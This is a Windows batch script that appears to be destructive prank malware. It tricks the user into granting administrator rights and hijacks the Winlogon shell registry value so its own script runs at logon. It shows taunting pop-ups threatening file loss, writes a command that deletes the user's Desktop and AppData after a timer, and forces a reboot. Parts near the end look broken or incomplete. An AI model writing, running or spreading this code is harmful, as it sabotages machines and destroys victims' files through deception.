@echo off
cd C:\users\%USERNAME%
echo set x=createobject("wscript.shell") > Windows_Event_Handler.vbs
echo X=MsgBox("Run this program on administrator mode",1+16,"heh") >> Windows_Event_Handler.vbs

net session >nul 2>&1
if %errorLevel% == 0 (
    goto inject
) else (
    start Windows_Event_Handler.vbs
    exit
)

:inject
cd %SystemRoot%\system32
md heh
cd heh

echo set x=createobject("wscript.shell") > heh.vbs
echo x=MsgBox("So this pc is pretty much unusuable now",1+64,":D") >> heh.vbs
echo x=MsgBox("you have around about one minute to end this...",1+64,"heh") >> heh.vbs
echo x=MsgBox("... or else you will lose all of your files",1+64,"LMFAO") >> heh.vbs

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "shell" /t REG_SZ /d "%systemroot%\system32\heh\tet.cmd" /f
cd %systemroot%\system32\heh
echo start cmd.exe > tet.cmd
echo start explorer.exe >> tet.cmd
echo start taskmgr >> tet.cmd
echo start heh.vbs >> tet.cmd

echo Set objShell = WScript.CreateObject("WScript.Shell") > run_.vbs
echo objShell.Run("get_hehed.cmd"), 0, True >> run_.vbs

echo timeout /T 60 /NOBREAK > get_hehed.cmd
echo cd c:\users\%username% >> get_hehed.cmd
echo del desktop >> get_hehed.cmd
echo del appdata >> get_hehed.cmd
echo


shutdown /r /t 0